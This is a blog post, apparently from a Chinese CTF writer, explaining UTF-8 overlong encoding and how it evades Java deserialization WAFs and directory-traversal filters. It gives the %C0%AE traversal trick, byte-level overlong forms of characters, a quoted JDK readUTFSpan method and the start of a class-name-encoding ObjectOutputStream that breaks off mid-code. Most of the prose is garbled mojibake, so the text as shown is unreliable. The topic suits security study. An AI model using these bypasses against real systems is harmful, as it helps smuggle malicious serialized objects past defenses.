    <content type="html"><![CDATA[<p>ä¹‹å‰åªæ˜¯æµ…æµ…çš„çŸ¥é“è¿™ä¸ªä¸œè¥¿ï¼Œç°åœ¨æ¥æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨javaé¢˜ç›®ä¸­æœ‰æ—¶ä¼šç”¨åˆ°è¯¥æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡</p><h1 id="utf-8ç¼–ç è¿‡ç¨‹"><a href="#UTF-8ç¼–ç è¿‡ç¨‹" class="headerlink" title="UTF-8ç¼–ç è¿‡ç¨‹"></a>UTF-8ç¼–ç è¿‡ç¨‹</h1><p>UTF-8ï¼ˆ8-bit Unicode Transformation Formatï¼‰æ˜¯ä¸€ç§ç”¨äºç¼–ç Unicodeå­—ç¬¦çš„å¯å˜é•¿åº¦å­—ç¬¦ç¼–ç æ–¹æ¡ˆã€‚å®ƒèƒ½å¤Ÿè¡¨ç¤ºUnicodeå­—ç¬¦é›†ä¸­çš„æ¯ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ä¸ASCIIç¼–ç å…¼å®¹ã€‚</p><p>å®ƒå¯ä»¥å°†Unicodeé‡Œçš„æ‰€æœ‰å­—ç¬¦è½¬æ¢æˆ1åˆ°4ä¸ªå­—èŠ‚æ¥è¡¨ç¤º</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªUnicodeå¯¹åº”UTF-8çš„è½¬æ¢è¡¨</p><p><img src="https://cdn.clown2024.cn/202410202132477.png" alt="image-20241020213226571"></p><ul><li>å¸¸è§çš„ASCIIå­—ç¬¦ï¼ˆU+0000åˆ°U+007Fï¼‰ç”¨1ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚</li><li>å…¶ä»–Unicodeå­—ç¬¦æ ¹æ®å…¶èŒƒå›´ä½¿ç”¨2åˆ°4ä¸ªå­—èŠ‚ã€‚</li></ul><p>ä»¥æ¬§å…ƒç¬¦å·â‚¬æ¥ä¸¾ä¾‹ï¼Œè¯¥ç¬¦å·çš„Unicodeç¼–ç ä¸ºU+20ACï¼Œä½äºU+0800å’ŒU+FFFFä¹‹é—´ï¼Œæ‰€ä»¥ä¸ºä¸‰ä¸ªå­—èŠ‚ï¼Œç¼–ç é•¿åº¦ä¸º3ï¼Œ0x20ACçš„äºŒè¿›åˆ¶ä¸º<strong>10 0000 1010 1100</strong></p><p>ç„¶åæ ¹æ®æ¯ä¸ªå­—èŠ‚ç¼ºçš„ä½æ•°ï¼Œä»å·¦è‡³å³æŒ‰é¡ºåºåˆ†æˆä¸‰ç»„ï¼Œç¬¬ä¸€ç»„é•¿åº¦ä¸æ»¡åœ¨å‰é¢è¡¥é›¶ï¼š0010ï¼Œ000010ï¼Œ101100</p><p>ç„¶åå¡«è¿›å»ï¼Œè½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œæ¬§å…ƒç¬¦å·çš„UTF-8ç¼–ç å°±æ˜¯<strong>\xE2\x82\xAC</strong></p><p>pythonæ¥decodeéªŒè¯ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410202147505.png" alt="image-20241020214652039"></p><h1 id="overlong-encodingç»•è¿‡åŸç†"><a href="#Overlong-Encodingç»•è¿‡åŸç†" class="headerlink" title="Overlong Encodingç»•è¿‡åŸç†"></a>Overlong Encodingç»•è¿‡åŸç†</h1><p>Overlong Encodingå°±æ˜¯å°†ä¸€ä¸ªå­—èŠ‚çš„å­—ç¬¦æŒ‰ç…§UTF-8çš„ç¼–ç å½¢å¼å¼ºè¡Œç¼–ç æˆä¸¤ä¸ªå­—ç¬¦</p><p>æ¯”å¦‚â€.â€è¿™ä¸ªå­—ç¬¦æ­£å¸¸Unicodeç¼–ç ä¸º0x2Eï¼ŒæŒ‰ç…§utf-8çš„å½¢å¼åªèƒ½è¢«ç¼–ç ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä¸¤ä¸ªå­—èŠ‚çš„ç¼–ç å½¢å¼ï¼Œé€šè¿‡è¡¥0å¼ºè¡Œåˆ†æˆä¸¤ç»„</p><p>0x2Eçš„äºŒè¿›åˆ¶æ˜¯10 1110ï¼Œç°åœ¨ç›´æ¥å‰é¢è¡¥5ä¸ª0ï¼Œå˜æˆ00000 101110è¿™æ ·çš„ä¸¤ç»„ï¼Œç„¶åä»–çš„UTF-8çš„ç¼–ç å½¢å¼å°±å˜æˆ<strong>\xC0\xAE</strong></p><p>ä½†æ˜¯è¿™ä¸ªç¼–ç å¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„UTF-8ç¼–ç ï¼Œæœ‰äº›è¯­è¨€åœ¨è½¬æ¢çš„æ—¶å€™ä¼šè¿›è¡Œæ£€æŸ¥æ¯”å¦‚pythonï¼›è€Œæœ‰äº›åˆ™å¯¹è¯¥æ£€æŸ¥å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´èƒ½å¤Ÿæ­£å¸¸è§£æå‡ºæ¥ï¼Œæ¯”å¦‚javaï¼Œè¿™å°±é€ æˆ<strong>Overlong Encodingç»•è¿‡</strong></p><p>pythonè¿›è¡Œè§£ç çš„è¯ä¼šæŠ¥ä¸‹é¢çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202410202204297.png" alt="image-20241020220411264"></p><p>ä¼šç›´æ¥è¯´éæ³•å­—èŠ‚ï¼Œæ— æ³•è½¬æ¢ç¼–ç </p><p>è¯¥ç»•è¿‡æ–¹å¼ä¼šåœ¨ä¸€äº›ç›®å½•ç©¿è¶Šçš„æ—¶å€™ç”¨åˆ°ï¼Œæ¯”å¦‚ç”¨%C0%AEæ¥ä»£æ›¿.ï¼Œæ¥ç»•è¿‡å¯¹ç›®å½•ç©¿è¶Šçš„é™åˆ¶ï¼ŒåŸå› å°±æ˜¯è¯¥æœåŠ¡åœ¨è·¯å¾„è§£ç æ—¶ä½¿ç”¨UTF-8ç¼–ç </p><h1 id="overlong-encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨"><a href="#Overlong-Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨" class="headerlink" title="Overlong Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨"></a>Overlong Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨</h1><p>åœ¨javaçš„wafä¸­é€šå¸¸æ˜¯æ£€æŸ¥åºåˆ—åŒ–çš„å­—èŠ‚æµä¸­æ˜¯å¦æœ‰æ•æ„Ÿç±»æ¥è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚é‡å†™resolveClassæ¥æ·»åŠ é»‘åå•ï¼Œå¦‚æœèƒ½å¤Ÿè¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–å¯èƒ½æœ‰æœºä¼šç»•è¿‡ä¸€äº›å…³é”®ç±»ï¼Œä½†å¦‚æœç¦ç”¨å¾—å¤ªæ­»å°±è½®åˆ°Overlong Encodingæ–¹æ³•æ¥å¤§æ˜¾èº«æ‰‹äº†ã€‚</p><blockquote><p>å›æ¥è¡¥å……äº†ï¼š</p><p>è¿™é‡Œæœ‰ä¸ªåœ°æ–¹å¾—çº æ­£ä¸€ä¸‹ï¼Œå¦‚æœé‡å†™äº†resolveClassçš„è¯ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•ç”¨utf-8æ¥ç»•è¿‡çš„ï¼Œå› ä¸ºresolveClasså·²ç»æ˜¯åœ¨ç±»çš„é“¾æ¥é˜¶æ®µäº†ï¼Œæ­¤æ—¶utf-8çš„è§£æå·²ç»è¿‡äº†ï¼Œæ‰€ä»¥åœ¨resolveClassçš„æ—¶å€™è¿˜æ˜¯èƒ½å¤Ÿçœ‹åˆ°å®Œæ•´çš„ç±»å</p><p>UTF-8åªé€‚ç”¨äºç›´æ¥å¯¹å­—èŠ‚æµè¿‡æ»¤çš„æƒ…å†µ</p></blockquote><h2 id="ç»•è¿‡åˆ†æ"><a href="#ç»•è¿‡åˆ†æ" class="headerlink" title="ç»•è¿‡åˆ†æ"></a>ç»•è¿‡åˆ†æ</h2><p>æˆ‘ä»¬çŸ¥é“åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œç±»åæ˜¯ç›´æ¥æ˜æ–‡å¯è¯»ï¼Œwafæ£€æµ‹ä¹Ÿæ˜¯åŸºäºæ­¤å½¢å¼ï¼Œé‚£ç»•è¿‡çš„æ€è·¯å°±æ˜¯åˆ©ç”¨Overlong Encodingæ¥ç¼–ç è¿™äº›ç±»åï¼Œè®©å…¶ä¸å¯è§ä»è€Œç»•è¿‡æ£€æµ‹</p><p>é‚£ç°åœ¨å°±å»çœ‹çœ‹javaååºåˆ—åŒ–æ—¶æ˜¯æ€ä¹ˆè¯»å–ç±»åï¼Œåˆ†æä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥ç»•è¿‡</p><p>è¿™é‡Œå°è¯•è‡ªå·±è°ƒäº†ä¸€ä¸‹ï¼Œå‘ç°ä¸å¤ªå¥½è°ƒ(ä¸»è¦æ˜¯å¤ªèœäº†ğŸ¥²)ï¼Œ1ueå¸ˆå‚…çš„æ–‡ç« ç»™å‡ºäº†è°ƒç”¨æ ˆï¼Œå°±ä¸é‡å¤´è‡ªå·±è°ƒäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectStreamClass#readNonProxy(ObjectInputStream in)<br>ObjectInputStream#readUTF()<br>BlockDataInputStream#readUTF()<br>ObjectInputStream#readUTFBody(long utflen)<br>ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)<br></code></pre></td></tr></table></figure><p>ç›´æ¥æ–­åœ¨readNonProxyæ–¹æ³•çš„è°ƒç”¨å¤„</p><p><img src="https://cdn.clown2024.cn/202410202345526.png" alt="image-20241020234544465"></p><p>çœ‹ä¸€ä¸‹ideaçš„è°ƒç”¨æ ˆï¼Œå¤§æ¦‚çŸ¥é“ä¸€ä¸‹æ€ä¹ˆæ¥åˆ°è¿™é‡Œçš„</p><p><img src="https://cdn.clown2024.cn/202410202346567.png" alt="image-20241020234623530"></p><p>ç„¶åè·Ÿè¿›readNonProxyæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410202347133.png" alt="image-20241020234726090"></p><p>å¯ä»¥çœ‹åˆ°ç±»åçš„è¯»å–å°±æ˜¯ç”¨readUTFæ–¹æ³•</p><p>ç„¶åç›´æ¥èµ°åˆ°æ¯”è¾ƒå…³é”®çš„ObjectInputStream#readUTFBodyæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410202354104.png" alt="image-20241020235420062"></p><p>æœ€åçš„è¯»å–å®ç°é€»è¾‘å°±åœ¨è¿™ä¸¤ä¸ªæ–¹æ³•é‡Œé¢ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•é‡Œé¢è¯»å–å­—èŠ‚çš„å…³é”®é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œçœ‹å…¶ä¸­ä¸€ä¸ªå³å¯</p><p>è¿™é‡Œçœ‹ä¸€ä¸‹readUTFSpanæ–¹æ³•çš„é€»è¾‘ï¼Œè¯¥æ–¹æ³•å°±æ˜¯æ ¹æ®utflenå»è·å–classnameçš„å€¼å¹¶è¿”å›åˆ°sbufä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-title function_">readUTFSpan</span><span class="hljs-params">(StringBuilder sbuf, <span class="hljs-type">long</span> utflen)</span><br>            <span class="hljs-keyword">throws</span> IOException<br>        &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cpos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> pos;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">avail</span> <span class="hljs-operator">=</span> Math.min(end - pos, CHAR_BUF_SIZE);<br>            <span class="hljs-comment">// stop short of last char unless all of utf bytes in buffer</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">stop</span> <span class="hljs-operator">=</span> pos + ((utflen &gt; avail) ? avail - <span class="hljs-number">2</span> : (<span class="hljs-type">int</span>) utflen);<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">outOfBounds</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> (pos &lt; stop) &#123;<br>                    <span class="hljs-type">int</span> b1, b2, b3;<br>                    b1 = buf[pos++] &amp; <span class="hljs-number">0xFF</span>;<br>                    <span class="hljs-keyword">switch</span> (b1 &gt;&gt; <span class="hljs-number">4</span>) &#123;<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:   <span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:  <span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>                            b2 = buf[pos++];<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:  <span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>                            b3 = buf[pos + <span class="hljs-number">1</span>];<br>                            b2 = buf[pos + <span class="hljs-number">0</span>];<br>                            pos += <span class="hljs-number">2</span>;<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">default</span>:  <span class="hljs-comment">// 10xx xxxx, 1111 xxxx</span><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ArrayIndexOutOfBoundsException ex) &#123;<br>                outOfBounds = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (outOfBounds || (pos - start) &gt; utflen) &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     * Fix for 4450867: if a malformed utf char causes the</span><br><span class="hljs-comment">                     * conversion loop to scan past the expected end of the utf</span><br><span class="hljs-comment">                     * string, only consume the expected number of utf bytes.</span><br><span class="hljs-comment">                     */</span><br>                    pos = start + (<span class="hljs-type">int</span>) utflen;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                &#125;<br>            &#125;<br><br>            sbuf.append(cbuf, <span class="hljs-number">0</span>, cpos);<br>            <span class="hljs-keyword">return</span> pos - start;<br>        &#125;<br></code></pre></td></tr></table></figure><p>é‡Œé¢åˆ†åˆ«å¯¹1å­—èŠ‚ã€2å­—èŠ‚ã€3å­—èŠ‚çš„å½¢å¼è¿›è¡Œäº†å¤„ç†ï¼Œå¯¹å­—èŠ‚æ ¼å¼çš„åˆ¤æ–­æ˜¯é€šè¿‡b1çš„é«˜å››ä½æ¥ç¡®å®šçš„</p><p><strong>1å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„å¤„ç†å¾ˆç®€å•ï¼Œç›´æ¥å°†b1å­—èŠ‚å€¼è½¬æ¢æˆå­—ç¬¦</p><p><strong>2å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>b2 = buf[pos++];<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>     <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>        ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯å¦ç¬¦åˆæ ¼å¼ï¼Œç„¶ååˆå¹¶ä¸¤ä¸ªå­—èŠ‚ç”Ÿæˆå­—ç¬¦</p><p>é¦–å…ˆæ ¹æ®b1é«˜å››ä½ä¸º12æˆ–è€…13ï¼ŒçŸ¥é“b1çš„å‰å››ä½åªèƒ½ä¸º1100æˆ–1101ï¼Œä¹Ÿå°±æ˜¯å‰ä¸‰ä½å›ºå®šä¸º110ï¼›b2ä¸ä¸Š0xc0ä¸€å®šè¦ä¸º0x80ï¼Œæ‰€ä»¥b2å‰ä¸¤ä½ä¸€å®šä¸º10ï¼›</p><p>ç„¶ååœ¨è½¬æ¢å­—ç¬¦çš„æ—¶å€™ï¼Œç”±b1å­—èŠ‚çš„æœ€åä¸¤ä½å’Œb2çš„åå…­ä½æ„æˆå­—ç¬¦çš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯unicodeçš„ä»£ç ç‚¹ï¼Œæœ€åè¯»å–å‡ºæˆ‘ä»¬çš„å­—ç¬¦</p><p>b1&amp;0x1Fçš„ä½œç”¨å°±æ˜¯å»é™¤å‰ç¼€110ï¼ŒåŒæ ·çš„b2&amp;0x3Fçš„ä½œç”¨å°±æ˜¯å»é™¤å‰ç¼€10</p><blockquote><p>è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒé‡è¦çš„åœ°æ–¹ï¼Œå°±æ˜¯intç±»å‹çš„ç§»ä½</p><p>å› ä¸ºä¸€å¼€å§‹ä¹ æƒ¯æ€§çš„è®¤ä¸ºè¶…å‡º8ä½ä¼šè¢«æˆªæ–­ï¼Œåæ¥ä¸€æƒ³å¦‚æœåªæœ‰8ä½æ€ä¹ˆè¡¨ç¤ºunicodeå­—ç¬¦è¿™ä¹ˆå¤§çš„ä»£ç ç‚¹å‘¢</p><p>åæ¥å°±çŸ¥é“äº†intç±»å‹å› ä¸ºæ˜¯32ä½ï¼Œä»–æ˜¯æŒ‰ç…§32ä½æ¥ç§»ä½çš„ï¼Œæ‰€ä»¥ä¸Šé¢çš„ç§»ä½æ“ä½œå¹¶ä¸ä¼šå‘ç”Ÿæˆªæ–­ï¼Œä¹Ÿå°±æ˜¯æ¯”å¦‚ï¼š00010100å·¦ç§»äº”ä½æ˜¯10100 00000ï¼Œè¿™æ˜¯æŒ‰ç…§32ä½æ¥çš„ï¼Œè¿™æ ·ä¸Šé¢çš„åˆå¹¶æ“ä½œçœ‹èµ·æ¥å°±åˆç†äº†</p></blockquote><p>å¦‚æœæƒ³è¦ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦æ¯”å¦‚oçš„è¯ï¼Œ<strong>oçš„äºŒè¿›åˆ¶ä¸º01101111</strong>ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¦æ±‚å°†å…¶æ‰©å……æˆä¸¤å­—èŠ‚UTF-8çš„ç¼–ç </p><p>æ ¹æ®ä¸Šé¢å¯çŸ¥ï¼Œb1ä¿ç•™äº†è‡ªå·±çš„ä¸­é—´3ä½ï¼Œå½¢å¼ä¸º 110+ä¸‰ä½+è¦åˆå¹¶çš„ä¸¤ä½ï¼Œb2å°±æ˜¯b1çš„åä¸¤ä½åŠ ä¸Šè‡ªå·±çš„å6ä½ï¼Œæ‰€ä»¥è¿™å…­ä½å¾ˆå®¹æ˜“çŸ¥é“æ˜¯å›ºå®šçš„ï¼Œb2çš„å‰ç¼€ä¸€å®šä¸º10ï¼Œæ‰€ä»¥b2å°±æ˜¯å›ºå®šçš„æ²¡åŠæ³•å˜åŒ–</p><p>ç„¶åæˆ‘ä»¬æƒ³è½¬å­—ç¬¦çš„è¯ï¼Œç”±äºå­—æ¯çš„Unicodeç¼–ç æ˜¯0-127ï¼Œæ‰€ä»¥ç¬¬ä¸€ä½å­—èŠ‚è‚¯å®šä¸º0ï¼Œå¦‚æœæˆ‘ä»¬è¦å¾—åˆ°è¿™ç§å½¢å¼ï¼Œé‚£ä¹ˆb1çš„ä¸­é—´3ä½ä¸€å®šå¾—ä¸º0ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œåˆå¹¶çš„ä¸¤ä½å°±æ˜¯æˆ‘ä»¬oå­—ç¬¦çš„å‰ä¸¤ä½</p><p>æ‰€ä»¥oè½¬æ¢æˆèƒ½å¤Ÿè§£æçš„äºŒè¿›åˆ¶å½¢å¼å°±ä¸ºï¼š11000001 10101111ï¼Œå›ºå®šä¸º\xC1\xAF</p><p><strong>3å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>b3 = buf[pos + <span class="hljs-number">1</span>];<br>b2 = buf[pos + <span class="hljs-number">0</span>];<br>pos += <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>         ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>         ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>åŒæ ·æ£€æŸ¥åä¸¤ä¸ªå­—èŠ‚ç„¶ååˆå¹¶ç”Ÿæˆå­—ç¬¦ï¼Œæœ‰å‰é¢åˆ†æ2å­—èŠ‚å¤„ç†çš„åŸºç¡€ï¼Œåˆ†æ3å­—èŠ‚çš„å¤„ç†ä¹Ÿå°±ç®€å•å¾ˆå¤šäº†</p><p>é¦–å…ˆb1å³ç§»4ä½ç­‰äº14ï¼Œå³å‰ç¼€ä¸€å®šæ˜¯1110ï¼Œç„¶åå°±æ˜¯åˆ¤æ–­b2ã€b3å‰ç¼€æ˜¯å¦ä¸º10</p><p>åˆå¹¶çš„é€»è¾‘å°±æ˜¯ï¼šb1å»é™¤å‰ç¼€å·¦ç§»12ä½ï¼Œb2å»é™¤å‰ç¼€å·¦ç§»6ä½ï¼Œb3å»é™¤å‰ç¼€ä¸ç§»ä½</p><p>ç„¶åå°±æ˜¯æƒ³è¦ä¸‰å­—èŠ‚åˆå¹¶ä¸ºä¸€ä¸ªasciiå­—ç¬¦æœ‰ä»€ä¹ˆè¦æ±‚äº†</p><ul><li>b1ï¼šä¸ºå‰ç¼€1110 + 0000ï¼Œå›ºå®šäº†</li><li>b3ï¼šæ²¡æœ‰ç§»ä½ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œå°±æ˜¯10+æˆ‘ä»¬è¦è½¬åŒ–çš„å­—ç¬¦çš„åå…­ä½</li><li>b2ï¼š100000 + å­—ç¬¦å‰ä¸¤ä½</li></ul><p>ä¾‹å¦‚ç”¨b1ï¼Œb2ï¼Œb3è¡¨ç¤ºjå­—ç¬¦ï¼š11100000 10000001 10101010</p><h2 id="è½¬æ¢ä¸ºoverlong-encoding"><a href="#è½¬æ¢ä¸ºOverlong-Encoding" class="headerlink" title="è½¬æ¢ä¸ºOverlong Encoding"></a>è½¬æ¢ä¸ºOverlong Encoding</h2><p>é‚£ä¹ˆåº”è¯¥å¯¹ç±»è¿›è¡Œè½¬æ¢å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°ç›´æ¥æš´åŠ›å°†æ‰€æœ‰åºåˆ—åŒ–å­—èŠ‚æµè¿›è¡Œæ›¿æ¢ï¼Œä½†ä¼šç ´åä¸€äº›éç±»åçš„ä¿¡æ¯ï¼Œå¯èƒ½å¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ï¼Œ<a href="https://xz.aliyun.com/u/81008"><strong>lzstar</strong></a>å¸ˆå‚…çš„æ–‡ç« ä¸­ç»™å‡ºäº†æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç»§æ‰¿ObjectOutputStreamé‡å†™é‡Œé¢çš„åºåˆ—åŒ–é€»è¾‘ï¼Œæ›´å‡†ç¡®çš„è¯´ï¼Œæ˜¯é‡å†™åºåˆ—åŒ–ç±»åçš„æ–¹æ³•</p><p>å¸ˆå‚…çš„é‡å†™æ€è·¯å°±æ˜¯ç»§æ‰¿ObjectOutputStreamï¼Œé‡å†™writeClassDescriptoræ–¹æ³•ï¼Œåœ¨writeClassDescriptoræ–¹æ³•ä¸­å®ç°desc.writeNonProxy(this)æ–¹æ³•çš„é€»è¾‘å’Œå°†ç±»åOverlong Encodingçš„é€»è¾‘ï¼Œå…·ä½“æ“ä½œçš„è¯å°±æ˜¯ç›´æ¥å°†desc.writeNonProxy(this)æ–¹æ³•çš„é€»è¾‘å¤åˆ¶è¿›å»ï¼Œç¼ºå°‘çš„å±æ€§å¯ä»¥é€šè¿‡åå°„è·å–ï¼Œç¼ºå°‘çš„æ–¹æ³•å¯ä»¥é€šè¿‡åå°„è°ƒç”¨ï¼Œä¹‹ååœ¨é‡Œé¢åŠ ä¸ŠOverlong Encodingçš„é€»è¾‘å°±å¯ä»¥äº†ã€‚</p><p>ç›´æ¥è´´å¸ˆå‚…çš„ä»£ç äº†è¿™é‡Œï¼Œè†œæ‹œä½¬orz</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å‚è€ƒpç¥ï¼šhttps://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg</span><br><span class="hljs-comment"> * å‚è€ƒ1ueï¼šhttps://t.zsxq.com/17LkqCzk8</span><br><span class="hljs-comment"> * å®ç°ï¼šå‚è€ƒ OObjectOutputStream# protected void writeClassDescriptor(ObjectStreamClass desc)æ–¹æ³•</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomObjectOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title 